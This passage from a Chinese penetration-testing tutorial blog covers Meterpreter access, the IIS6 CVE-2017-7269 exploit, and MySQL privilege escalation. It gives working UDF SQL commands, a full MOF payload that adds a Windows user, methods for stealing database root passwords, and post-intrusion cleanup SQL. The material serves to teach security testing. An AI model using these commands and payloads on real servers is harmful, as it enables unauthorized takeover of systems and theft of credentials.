<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526488034.9706159.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526488098.0305846.png" alt=""></p>
<p>&emsp;&emsp;这样就获取到了一个<code>Meterpreter shell</code>了，接下来就可以进行添加用户，远程桌面连接等操作了。</p>
<h4 id="IIS6远程代码执行"><a href="#IIS6远程代码执行" class="headerlink" title="IIS6远程代码执行"></a>IIS6远程代码执行</h4><p>&emsp;&emsp;IIS6远程代码执行漏洞的编号为<code>CVE-2017-7269</code>，需要IIS6允许WebDAV扩展才能触发漏洞，我们还是以MSF的Exploit进行演示。</p>
<ul>
<li>1.搜索CVE编号</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526489843.0644019.png" alt=""></p>
<ul>
<li>2.利用漏洞</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526489746.7099216.png" alt=""></p>
<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>&emsp;&emsp;数据库是一个动态Web站点的核心部分，但也是攻击者非常喜爱的一个部分，因为攻击者可以通过数据库获取更高的权限，由于数据库用户的密码过于简单而被猜解和数据库权限配置不当导致服务器沦陷的事件也常有发生。</p>
<p>&emsp;&emsp;数据库服务默认是以系统权限来运行着的，那么攻击者通过数据库获取到的cmdshell的权限也将是系统权限，因此数据库常常被攻击者用来作为提权的手段。在本章节，我将给大家介绍数据库提权的方法。</p>
<h3 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h3><p>&emsp;&emsp;MySQL数据库服务的默认端口为3306端口，一般支持PHP的站点都会支持MySQL数据库。所以在信息探测时候，发现站点支持PHP脚本，并且开放着3306端口则可以使用MySQL提权的方法来提升权限。接下来我将给大家介绍MySQL提权的3种方法。</p>
<p>&emsp;&emsp;MySQL提权的前期是：知道MySQL的root用户的密码，获取到Webshell以后寻找MySQL的root用户的密码有以下两种方法：</p>
<ul>
<li>1.翻看网站的配置文件，有的站点会使用root用户接入数据库，所以在配置文件中可以找到root用户的明文密码。(有时候一个服务器有多个站点，多翻几个站点的配置文件，很有可能会找到root用户的明文密码)</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527143982.084238.png" alt=""></p>
<ul>
<li>2.从MySQL的数据文件中找，一般情况下MySQL的数据文件存放在MySQL目录下的data目录下，也有可能放在其他目录，如果修改MySQL的数据文件存放目录的话，需要在<code>my.ini</code>中设置<code>datadir=数据文件存放目录</code>。找到数据文件存放的目录后，打开该目录下的<code>mysql目录</code>，其中的<code>user.MYD</code>中存放着MySQL数据库所有用户的帐号密码。</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527144246.9513874.png" alt=""></p>
<p>&emsp;&emsp;直接打开<code>user.MYD</code>比较乱，笔者的建议是把<code>user.MYD,user.frm和user.MYI</code>下载到本地，放在本地MySQL的data目录下，新建一个文件夹(文件夹名就是数据库名)放进去</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527144476.8685381.png" alt=""></p>
<p>&emsp;&emsp;然后使用phpMyAdmin或其他数据库管理软件查看该数据库中的User表中的帐号密码，这些帐号密码就是目标站点的数据库用户信息。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527144592.4981518.png" alt=""></p>
<p><strong>经验之谈：</strong></p>
<p>&emsp;&emsp;有时候，shell对<code>MySQLBaseDir</code>目录没有访问权限，那么可以直接访问<code>MySQLBaseDir\data\</code>目录，因为要对数据库有修改权限，必须有对<code>MySQLBaseDir\data\</code>目录的修改权限。</p>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>&emsp;&emsp;UDF提权时MySQL提权中最常用并且成功率最高的一种方法。UDF的全称是User Defined Function，意为用户自定义函数。具体的测试步骤如下：</p>
<p>&emsp;&emsp;第一步：查看MySQL的版本，MySQL的版本决定了dll导出的目录(后面会介绍)。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527143330.3619614.png" alt=""></p>
<p>&emsp;&emsp;第二步：导出shellcode，不同的MySQL版本shellcode导出的目录不同。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527145547.5487776.png" alt=""></p>
<p>&emsp;&emsp;本次测试环境是MySQL5.5的，因此要导出到MySQL的plugin目录下，可以使用<code>show variables like &#39;%plugin%&#39;;</code>来查看plugin目录，默认的plugin目录是<code>basedir\lib\plugin</code>。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527145724.2708855.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 导出shellcode语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">0</span>xUDFcode <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\phpstudy\\MySQL\\lib\\plugin\\tony.dll'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527146209.4840155.png" alt=""></p>
<p>&emsp;&emsp;由于篇幅有限，shellcode就不写在这里了，如有需要请到<code>http://admintony.com/udf.txt</code>自行下载。</p>
<p>&emsp;&emsp;第三步：使用dll创建函数。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> shell <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527146573.5302963.png" alt=""></p>
<p>&emsp;&emsp;第四步：使用该函数执行命令。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> shell(<span class="string">'cmd'</span>,<span class="string">'whoami'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527146671.0105908.png" alt=""></p>
<p>&emsp;&emsp;到这里权限已经提升到了administrator的权限了，具体提权后的权限能达到多高，取决于MySQL服务运行者的权限，也有很多站长把MySQL降权运行，那么使用MySQL提权后的权限只能达到用户权限。</p>
<p><strong>经验之谈：</strong></p>
<p>&emsp;&emsp;在很多实际环境中UDF提权也会遇到很多问题，在这里笔者将常见的问题总结罗列一下：</p>
<ul>
<li>1.MySQL目录下<code>lib/plugin</code>目录不存在，怎么办？</li>
</ul>
<p>&emsp;&emsp;可以使用SQL语句创建目录，也可以在shell中手动创建目录。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\。。lib::$INDEX_ALLOCATION'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\。。lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>2.导出dll受到secure_file_priv的影响无法导出，怎么办？</li>
</ul>
<p>&emsp;&emsp;可以在本地将shellcode导出到dll，再上传到目标网站的<code>mysqlBaseDir\lib\plugin\</code>目录下，也有些时候shell不具备<code>mysqlBaseDir</code>的访问权限，你可以直接测试<code>mysqlBaseDir\lib\plugin\</code>是否有访问权限。</p>
<ul>
<li>3.提示错误 Can’t open shared library ‘udf.dll’ (errno: 2 )</li>
</ul>
<p>&emsp;&emsp;除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。</p>
<ul>
<li>4.提示错误 Can’t find symbol ‘cmdshell’ in library</li>
</ul>
<p>&emsp;&emsp;该函数在字典中被删除了，可以用<code>shell</code>，<code>sys_exec</code>或者<code>sys_eval</code>代替。</p>
<ul>
<li>5.入侵以后删除函数的SQL语句</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'shell'</span></span><br></pre></td></tr></table></figure>
<h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><p>&emsp;&emsp;MOF(托管对象格式)是Windows系统的一个文件，其目录为<code>C:/windows/system32/wbem/mof/nullevt.mof</code>，其作用是每隔一段时间去监控进程的创建和死亡，MOF提权就是使用MySQL的Root权限将含有恶意代码的MOF文件上传到该目录下。</p>
<p>&emsp;&emsp;MOF提权具体步骤如下：</p>
<p>&emsp;&emsp;第一步：上传MOF文件，MOF代码在本节最后</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201807/1532053383.3254056.png" alt=""></p>
<p>&emsp;&emsp;第二步：将MOF导出到<code>C:/windows/system32/wbem/mof/</code>目录，并重命名为<code>nullevt.mof</code>，其SQL语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'C:/phpStudy/WWW/mof.txt'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201807/1532053678.0693023.png" alt=""></p>
<p>&emsp;&emsp;然后看一下用户，用户已经加上了</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201807/1532055839.24688.png" alt=""></p>
<p>&emsp;&emsp;第三步：将用户加入管理组，修改一下MOF文件中的系统命令，再导出即可。过2分钟后，查看administrators组中的用户，如下图所示。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201807/1532055741.535133.png" alt=""></p>
<p>&emsp;&emsp;MOF样本如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription") </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span> </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">    Name  = <span class="string">"filtP2"</span>; </span><br><span class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span> </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span> </span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>; </span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span> </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admintony admin /add\")"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = <span class="variable">$Consumer</span>; </span><br><span class="line">    Filter = <span class="variable">$EventFilter</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>经验之谈</strong></p>
<ul>
<li><p>1.MOF代码中<code>And TargetInstance.Second = 5</code>决定了每分钟的第几秒执行该MOF文件</p>
</li>
<li><p>2.MOF提权后，命令会一直执行，有可能会导致服务器宕机，所以请测试者进入系统后，去<code>C:/windows/system32/wbem/mof/good</code>中删除<code>nullevt.mof</code> </p>
</li>
<li><p>3.该方法适用于比较久的机器，笔者在<code>Win03 sp2</code>测试成功。</p>
</li>
</ul>
<h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><h3 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h3>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/渗透测试-知识体系/" rel="tag"># 渗透测试,知识体系</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/关于上传中的00截断分析.html" rel="next" title="关于上传中的00截断分析">
                <i class="fa fa-chevron-left"></i> 关于上传中的00截断分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/FTP客户端和服务端的编写.html" rel="prev" title="FTP客户端和服务端的编写">
                FTP客户端和服务端的编写 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="AdminTony" />
            
              <p class="site-author-name" itemprop="name">AdminTony</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">53</span>
                  <span class="site-state-item-name">文章</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">66</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">105</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t00ls.net/index.php" title="T00ls.net" target="_blank">T00ls.net</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.sqlsec.com/" title="国光" target="_blank">国光</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://ares-x.com" title="ares-x" target="_blank">ares-x</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://paper.seebug.org" title="Paper" target="_blank">Paper</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.e-wolf.top/" title="A." target="_blank">A.</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#目录"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#是否存在CDN"><span class="nav-number">2.1.</span> <span class="nav-text">是否存在CDN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证是否存在CDN"><span class="nav-number">2.1.1.</span> <span class="nav-text">验证是否存在CDN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过CDN查找网站真实IP"><span class="nav-number">2.1.2.</span> <span class="nav-text">绕过CDN查找网站真实IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过CDN防护"><span class="nav-number">2.1.3.</span> <span class="nav-text">绕过CDN防护</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器信息"><span class="nav-number">2.2.</span> <span class="nav-text">服务器信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子域名收集"><span class="nav-number">2.3.</span> <span class="nav-text">子域名收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Digger-v2-0"><span class="nav-number">2.3.1.</span> <span class="nav-text">Digger v2.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Layer子域名挖掘机"><span class="nav-number">2.3.2.</span> <span class="nav-text">Layer子域名挖掘机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#云悉资产收集"><span class="nav-number">2.3.3.</span> <span class="nav-text">云悉资产收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Whois查询"><span class="nav-number">2.4.</span> <span class="nav-text">Whois查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指纹验证"><span class="nav-number">2.5.</span> <span class="nav-text">指纹验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF探测"><span class="nav-number">2.6.</span> <span class="nav-text">WAF探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wafw00f"><span class="nav-number">2.6.1.</span> <span class="nav-text">wafw00f</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手工探测WAF"><span class="nav-number">2.6.2.</span> <span class="nav-text">手工探测WAF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绝对路径"><span class="nav-number">2.7.</span> <span class="nav-text">绝对路径</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞发现"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#目录扫描"><span class="nav-number">3.1.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#蜘蛛爬行"><span class="nav-number">3.2.</span> <span class="nav-text">蜘蛛爬行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞扫描器"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞扫描器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AWVS"><span class="nav-number">3.3.1.</span> <span class="nav-text">AWVS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Burpsuite"><span class="nav-number">3.3.2.</span> <span class="nav-text">Burpsuite</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#根据CMS发现漏洞"><span class="nav-number">3.4.</span> <span class="nav-text">根据CMS发现漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源代码泄露漏洞"><span class="nav-number">4.</span> <span class="nav-text">源代码泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码压缩包泄露"><span class="nav-number">4.1.</span> <span class="nav-text">代码压缩包泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVN源代码泄露"><span class="nav-number">4.2.</span> <span class="nav-text">SVN源代码泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">4.2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SVN源代码泄露两个版本的区别"><span class="nav-number">4.2.2.</span> <span class="nav-text">SVN源代码泄露两个版本的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用工具"><span class="nav-number">4.2.3.</span> <span class="nav-text">利用工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#git源码泄露"><span class="nav-number">4.3.</span> <span class="nav-text">git源码泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swp源码泄露"><span class="nav-number">4.4.</span> <span class="nav-text">swp源码泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库外泄"><span class="nav-number">4.5.</span> <span class="nav-text">数据库外泄</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-INF-web-xml泄露"><span class="nav-number">4.6.</span> <span class="nav-text">WEB-INF/web.xml泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB-INF介绍"><span class="nav-number">4.6.1.</span> <span class="nav-text">WEB-INF介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞检测和利用"><span class="nav-number">4.6.2.</span> <span class="nav-text">漏洞检测和利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVS泄露"><span class="nav-number">4.6.3.</span> <span class="nav-text">CVS泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DS-Store文件泄漏"><span class="nav-number">4.7.</span> <span class="nav-text">DS_Store文件泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因-1"><span class="nav-number">4.7.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.7.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bazaar-bzr"><span class="nav-number">4.8.</span> <span class="nav-text">Bazaar/bzr</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">5.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入产生原理"><span class="nav-number">5.1.</span> <span class="nav-text">SQL注入产生原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入分类"><span class="nav-number">5.2.</span> <span class="nav-text">SQL注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#根据数据库类型分类"><span class="nav-number">5.2.1.</span> <span class="nav-text">根据数据库类型分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ACCESS注入"><span class="nav-number">5.2.1.1.</span> <span class="nav-text">ACCESS注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL注入"><span class="nav-number">5.2.1.2.</span> <span class="nav-text">MySQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSSQL注入"><span class="nav-number">5.2.1.3.</span> <span class="nav-text">MSSQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle注入"><span class="nav-number">5.2.1.4.</span> <span class="nav-text">Oracle注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据注入点权限划分"><span class="nav-number">5.2.2.</span> <span class="nav-text">根据注入点权限划分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#普通权限注入"><span class="nav-number">5.2.2.1.</span> <span class="nav-text">普通权限注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#高权限注入"><span class="nav-number">5.2.2.2.</span> <span class="nav-text">高权限注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据页面回显不同分类"><span class="nav-number">5.2.3.</span> <span class="nav-text">根据页面回显不同分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#普通注入"><span class="nav-number">5.2.3.1.</span> <span class="nav-text">普通注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入"><span class="nav-number">5.2.3.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注-基于布尔的盲注"><span class="nav-number">5.2.3.3.</span> <span class="nav-text">盲注-基于布尔的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注-基于时间的盲注"><span class="nav-number">5.2.3.4.</span> <span class="nav-text">盲注-基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据程序SQL语句分类"><span class="nav-number">5.2.4.</span> <span class="nav-text">根据程序SQL语句分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#INSERT注入"><span class="nav-number">5.2.4.1.</span> <span class="nav-text">INSERT注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#检测方法"><span class="nav-number">5.2.4.1.1.</span> <span class="nav-text">检测方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错法"><span class="nav-number">5.2.4.1.2.</span> <span class="nav-text">报错法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#闭合语句法"><span class="nav-number">5.2.4.1.3.</span> <span class="nav-text">闭合语句法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UPDATE注入"><span class="nav-number">5.2.4.2.</span> <span class="nav-text">UPDATE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#检测方法-1"><span class="nav-number">5.2.4.2.1.</span> <span class="nav-text">检测方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错法-1"><span class="nav-number">5.2.4.2.2.</span> <span class="nav-text">报错法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#闭合语句法-1"><span class="nav-number">5.2.4.2.3.</span> <span class="nav-text">闭合语句法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DELETE注入"><span class="nav-number">5.2.4.3.</span> <span class="nav-text">DELETE注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据提交方式分类"><span class="nav-number">5.2.5.</span> <span class="nav-text">根据提交方式分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET注入"><span class="nav-number">5.2.5.1.</span> <span class="nav-text">GET注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST注入"><span class="nav-number">5.2.5.2.</span> <span class="nav-text">POST注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#COOKIE注入"><span class="nav-number">5.2.5.3.</span> <span class="nav-text">COOKIE注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP头注入"><span class="nav-number">5.2.5.4.</span> <span class="nav-text">HTTP头注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据闭合方式分类"><span class="nav-number">5.2.6.</span> <span class="nav-text">根据闭合方式分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数字型注入"><span class="nav-number">5.2.6.1.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符型注入"><span class="nav-number">5.2.6.2.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索型注入"><span class="nav-number">5.2.6.3.</span> <span class="nav-text">搜索型注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#宽字节注入"><span class="nav-number">5.2.7.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入"><span class="nav-number">5.2.8.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE注入"><span class="nav-number">5.2.9.</span> <span class="nav-text">XXE注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找后台的方法"><span class="nav-number">5.3.</span> <span class="nav-text">找后台的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#目录扫描-1"><span class="nav-number">5.3.1.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#蜘蛛爬行-1"><span class="nav-number">5.3.2.</span> <span class="nav-text">蜘蛛爬行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#google黑客"><span class="nav-number">5.3.3.</span> <span class="nav-text">google黑客</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#遗留文件"><span class="nav-number">5.3.4.</span> <span 